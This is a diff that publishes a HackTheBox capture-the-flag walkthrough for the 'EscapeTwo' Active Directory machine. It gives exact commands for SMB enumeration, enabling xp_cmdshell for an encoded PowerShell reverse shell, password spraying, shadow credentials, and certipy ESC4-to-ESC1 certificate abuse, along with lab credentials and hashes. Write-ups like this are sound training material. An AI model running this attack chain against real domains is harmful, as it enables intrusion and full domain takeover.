@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>EscapeTwo - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/EscapeTwo.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for EscapeTwo machine from HackTheBox - Easy difficulty level">
+    <meta name="description" content="Detailed writeup for EscapeTwo machine from HackTheBox - Easy difficulty level">
     <meta name="keywords" content="HackTheBox, EscapeTwo, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,149 @@
         <h1 class="writeup-title">EscapeTwo</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active machine</span>
+            <span class="date">May 24, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Alert" src="../images/EscapeTwo/pwned.png" /></p>
-<p>EscapeTwo is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once EscapeTwo retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/EscapeTwo/pwned.png" />                                                                                                                                                                                                                         </p>
+<p>EscapeTwo was a fun Active Directory box that began with credentials for user rose.
+Initial enumeration via netexec revealed multiple domain users and accessible SMB shares, including an "Accounting Department" share containing excel files.
+By unzipping these files and examining their XML structure, I discovered hardcoded MSSQL SA credentials (sa:MSSQLP@ssw0rd!).</p>
+<p>With SA access to the MSSQL service, I enabled xp_cmdshell for command execution and established a reverse shell.
+Further enumeration of the SQL server configuration files revealed another password, which through password spraying, granted access to user ryan's account and the user flag.</p>
+<p>For privilege escalation, I leveraged Ryan's WriteOwner permissions over the CA_SVC account (discovered via BloodHound).
+After taking ownership and granting myself FullControl, I added shadow credentials to CA_SVC and extracted its NTLM hash.
+As a member of the Cert Publishers group, CA_SVC could modify certificate templates.
+I exploited this by converting an ESC4 vulnerability to ESC1 on the DunderMifflinAuthentication template, requested a certificate as the administrator, and used it to authenticate and extract the administrator's hash for full domain compromise.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/EscapeTwo/nmap.png" />                                                                                                                                                                                                                           </p>
+<p>Nmap scan reveals many ports which point towards AD presence. There is also a domain, and the name of the DC.                                                                                                                               </p>
+<p>I'll add those to my hostfile.                                                                                                                                                                                                              </p>
+<h2>Enumeration via netexec</h2>
+<p>Since this is an assumed breach scenario and I already have some credentials to begin with, I'll start with some basic enumeration using netexec.</p>
+<p>First, I will enumerate the users in this domain.</p>
+<p><code>netexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su --users</code></p>
+<p><img alt="users" src="../images/EscapeTwo/users.png" /></p>
+<p>A proper userlist could be useful for password spraying in the future. To create one with netexec, I'll direct the netexec output to a file by appending a <code>&gt; filename</code> at the end.</p>
+<p>I'll then use awk to grab the 5th column(where the usernames are) only.</p>
+<p><code>awk '{print$5}' filename</code></p>
+<p>The result was a nice userlist with a few bits of unwanted text.</p>
+<div class="codehilite"><pre><span></span><code><span class="k">[*]</span>
+<span class="k">[+]</span>
+<span class="na">-Username-</span>
+<span class="na">Administrator</span>
+<span class="na">Guest</span>
+<span class="na">krbtgt</span>
+<span class="na">michael</span>
+<span class="na">ryan</span>
+<span class="na">oscar</span>
+<span class="na">sql_svc</span>
+<span class="na">rose</span>
+<span class="na">ca_svc</span>
+<span class="k">[*]</span>
+</code></pre></div>
+
+<p>I'll delete the unwanted bits manually.</p>
+<p>Password spraying with rose's password returned no hits, so I'll move along with the enumeration. I'll check whether user rose can access any non-standard shares.</p>
+<p><img alt="shares" src="../images/EscapeTwo/shares.png" /></p>
+<p>There are two custom shares accessible to rose. Accounting Department and Users. I'll use smbclient to connect to them.</p>
+<p><code>smbclient //10.10.11.51/'Accounting Department' -u rose%KxEPkKe6R8su</code></p>
+<p><img alt="AD" src="../images/EscapeTwo/AD.png" /></p>
+<p>In the Accounting Department share, there are two excel sheets. I'll grab them onto my machine by using "get".</p>
+<p><img alt="usershare" src="../images/EscapeTwo/usershare.png" /></p>
+<p>There wasn't anything interesting in the users share. I'll come back to the excel sheets later after I'm done with the enumeration.</p>
+<p>One last thing I would like to do is run bloodhound for some nice visuals and attack planning.</p>
+<p><code>bloodhound-python -c all -u rose -p KxEPkKe6R8su -d sequel.htb -ns 10.10.11.51 --zip</code></p>
+<p><img alt="bh1" src="../images/EscapeTwo/bh1.png" /></p>
+<p>Ryan can remote into the machine. This will most likely be the user who has the user flag in their desktop.</p>
+<p><img alt="pbh2" src="../images/EscapeTwo/bh2.png" /></p>
+<p>But more importantly, Ryan has WriteOwner over the CA_SVC account. This essentially means FullControl over the account.</p>
+<p>Having such control over a CA-related account could allow a few certificate(ESC) attacks, but I'll return to that later.</p>
+<h2>Investigating the excel sheets</h2>
+<p>After I ran <code>file</code> against the .xlsx sheets, I took notice of the <code>Zip archive data</code> mention.</p>
+<p><code>accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate</code></p>
+<p>This means I should be able to unzip it, just like a .zip file.</p>
+<p><img alt="unzip" src="../images/EscapeTwo/unzip.png" /></p>
+<p>Sure enough, that's exactly what happened. I see a few .xml files, so I'll check those first.</p>
+<p>Eventually, I found something very promising after unzipping the accounts.xlsx file.</p>
+<p><img alt="sa" src="../images/EscapeTwo/sa.png" /></p>
+<p><code>sa | MSSQLP@ssw0rd!</code></p>
+<p>Sa(system administrator) is an account that has unrestricted access to MSSQL databases. I'll test these credentials by attempting to connect to mssql on the box via a client.</p>
+<p><img alt="sql" src="../images/EscapeTwo/sql.png" /></p>
+<h2>Command execution via MSSQL</h2>
+<p>In an ideal scenario, I'd be able to get code execution via the xp_cmdshell procedure.</p>
+<p><img alt="xp" src="../images/EscapeTwo/xp.png" /></p>
+<p>Even though it is disabled, I'm fairly confident that I can enable it back as sa.</p>
+<div class="codehilite"><pre><span></span><code>EXEC sp_configure &#39;xp_cmdshell&#39;, 1; - Enables xp_cmdshell
+RECONFIGURE; - Applies the changes
+</code></pre></div>
+
+<p>I'll run it again after changing the options.</p>
+<p><img alt="xp2" src="../images/EscapeTwo/xp2.png" /></p>
+<p>It worked. Now I can execute commands on the DC.</p>
+<p>I could start enumerating the filesystem through xp_cmdshell, but I'd like to gain a shell on the box to make that process smoother.</p>
+<p>It's easy to do so with xp_cmdshell. I'll use a base64 encoded revshell powershell command.</p>
+<p><code>xp_cmdshell powershell -e &lt;base64&gt;</code></p>
+<p><img alt="sqlshell" src="../images/EscapeTwo/sqlshell.png" /></p>
+<p>It connects back to my listener almost instantly.</p>
+<h2>Enumeration of the MSSQL config file</h2>
+<p>I navigated to the C:\ folder and found the SQL2019 directory.</p>
+<p>After a while of searching, I stumbled upon a .ini file that contained a new password inside.</p>
+<p><img alt="pass" src="../images/EscapeTwo/pass.png" /></p>
+<p>I'll take it, and I'll do some password spraying with the userlist created earlier.</p>
+<p><img alt="passspray" src="../images/EscapeTwo/passspray.png" /></p>
+<p>Ryan and sql_svc have the same password. Remembering what I've learned from bloodhound, Ryan is the account that should give me the user flag.</p>
+<p>I'll try remoting into the machine right now.</p>
+<p><img alt="user" src="../images/EscapeTwo/user.png" /></p>
+<h1>Root flag</h1>
+<p>Since user ryan has been taken over, I can move to attacking the CA_SVC account.</p>
+<h2>Taking over the CA_SVC account</h2>
+<p>First things first, I'll have to set the owner of CA_SVC to ryan. I'll use bloodyAD for that.</p>
+<p><code>bloodyAD -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --host DC01.sequel.htb --dc-ip 10.10.11.51 set owner CA_SVC ryan</code></p>
+<p>After that, I can give ryan FullControl over the svc account using impacket-dacledit.</p>
+<p><code>impacket-dacledit -dc-ip 10.10.11.51 -principal ryan -target CA_SVC -action write -rights FullControl sequel.htb/ryan:WqSZAF6CysDQbGb3</code></p>
+<p><img alt="dacl" src="../images/EscapeTwo/dacl.png" /></p>
+<p>With FullControl, I'll be able to add shadow credentials to the svc account. I'll do so by using bloodyad again.</p>
+<p><code>bloodyAD -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 --host DC01.sequel.htb --dc-ip 10.10.11.51 add shadowCredentials CA_SVC</code></p>
+<p><img alt="SC" src="../images/EscapeTwo/SC.png" /></p>
+<p>Following that, I'm going to use a few scripts from PKINITtools to ultimately gain the NThash of CA_SVC.</p>
+<p><img alt="tgt" src="../images/EscapeTwo/tgt.png" /></p>
+<p>I got a TGT, but it doesn't interest me too much in this case. I'll take the AS-REP encryption key though as it'll be very useful soon.</p>
+<p>After setting the KRB5CCNAME variable to my .ccache file, I ran the getnthash.py script.</p>
+<p><img alt="hash" src="../images/EscapeTwo/hash.png" /></p>
+<p>And got the hash.</p>
+<h2>Modifying the cert template(ESC4 to ESC1)</h2>
+<p>I'll use certipy to find active and vulnerable cert templates in the domain.</p>
+<p><code>certipy-ad find -enabled -vulnerable -dc-ip 10.10.11.51 -target-ip 10.10.11.51 -u CA_SVC -hashes '3b181b914e7a9d5508ea1e20bc2b7fce'</code></p>
+<p><img alt="vuln" src="../images/EscapeTwo/vuln.png" /></p>
+<p>This DunderMifflinAuthentication template can be modified by cert publishers, which CA_SVC is a member of.</p>
+<p>I will use certipy again to modify that template and make it vulnerable to ESC1.</p>
+<p>Certipy by default modifies the template for exploitation via ESC1. I'll save the old config so that I can restore it after I'm done.</p>
+<p><code>certipy-ad template -username CA_SVC@sequel.htb -hashes '3b181b914e7a9d5508ea1e20bc2b7fce'  -template DunderMifflinAuthentication -save-old</code></p>
+<p><img alt="update" src="../images/EscapeTwo/update.png" /></p>
+<p>Next, I'll request a certificate with an UPN specified as administrator.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">certipy</span><span class="o">-</span><span class="n">ad</span><span class="w"> </span><span class="n">req</span><span class="w"> </span><span class="o">-</span><span class="n">ca</span><span class="w"> </span><span class="n">sequel</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="w"> </span><span class="o">-</span><span class="n">template</span><span class="w"> </span><span class="n">DUnderMifflinAuthentication</span><span class="w"> </span><span class="o">-</span><span class="n">upn</span><span class="w"> </span><span class="n">administrator</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10.11.51</span><span class="w"> </span><span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10.11.51</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">CA_SVC</span><span class="nv">@sequel</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">hashes</span><span class="w"> </span><span class="s1">&#39;3b181b914e7a9d5508ea1e20bc2b7fce&#39;</span>
+</code></pre></div>
+
+<p><img alt="error" src="../images/EscapeTwo/error.png" /></p>
+<p>I added a DNS flag in order to solve the error, but it still appeared.</p>
+<p>What worked in the end was modifying the template once again with the same command as before.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">certipy</span><span class="o">-</span><span class="n">ad</span><span class="w"> </span><span class="n">req</span><span class="w"> </span><span class="o">-</span><span class="n">ca</span><span class="w"> </span><span class="n">sequel</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="w"> </span><span class="o">-</span><span class="n">template</span><span class="w"> </span><span class="n">DunderMifflinAuthentication</span><span class="w"> </span><span class="o">-</span><span class="n">upn</span><span class="w"> </span><span class="n">administrator</span><span class="nv">@sequel</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10.11.51</span><span class="w"> </span><span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10.11.51</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">CA_SVC</span><span class="nv">@sequel</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">hashes</span><span class="w"> </span><span class="s1">&#39;3b181b914e7a9d5508ea1e20bc2b7fce&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">ns</span><span class="w"> </span><span class="mf">10.10.11.51</span><span class="w"> </span><span class="o">-</span><span class="n">dns</span><span class="w"> </span><span class="mf">10.10.11.51</span><span class="w"> </span><span class="o">-</span><span class="n">debug</span>
+</code></pre></div>
+
+<p><img alt="admcert" src="../images/EscapeTwo/admcert.png" /></p>
+<p>And lastly, I'll authenticate with the certificate to recover the administrator's hash.</p>
+<p><img alt="auth" src="../images/EscapeTwo/auth.png" /></p>
+<p>Now nothing is stopping me from connecting to the machine as the administrator, but first, I'll revert the template back to its original state.</p>
+<p>Even though this is a controlled box, it's good to make a habit of fixing up any dangerous changes that may have been left behind. Leaving this template in its vulnerable state would be extremely dangerous.</p>
+<p><code>certipy-ad template -configuration DunderMifflinAuthentication.json -username CA_SVC@sequel.htb -hashes '3b181b914e7a9d5508ea1e20bc2b7fce'  -template DunderMifflinAuthentication</code></p>
+<p><img alt="revert" src="../images/EscapeTwo/revert.png" /></p>
+<p>It got reverted back to its original state, pressumably by a regularly-running script. Still good to check though.</p>
+<p>Now I'll just remote into the machine as administrator, just like I did with ryan earlier.</p>
+<p><img alt="root" src="../images/EscapeTwo/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
